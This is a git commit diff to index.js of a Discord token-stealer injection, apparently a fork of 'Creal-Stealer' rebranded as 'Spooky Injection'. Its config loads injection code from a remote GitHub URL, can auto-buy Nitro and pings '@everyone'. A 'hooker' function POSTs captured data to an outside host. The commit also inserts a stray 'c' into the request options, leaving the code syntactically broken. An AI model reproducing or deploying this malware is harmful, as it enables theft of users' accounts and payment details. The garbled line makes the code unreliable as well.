d87be61ef26b72113282d67971f31a75d8f6bbd8
0x421 <arthnodeveloper@gmail.com>
2023-10-01 02:37:10 +0300

    Update index.js

--- index.js
+++ index.js
@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Creal Injection', 
+  embed_name: 'Spooky Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/0x421/injection/main/index.js', 
@@ -633,7 +633,7 @@ const hooker = async (content) => {
   }
   const options = {
     protocol: url.protocol,
-    hostname: url.host,
+    hostname: url.host,c
     path: url.pathname,
     method: 'POST',
     headers: headers,
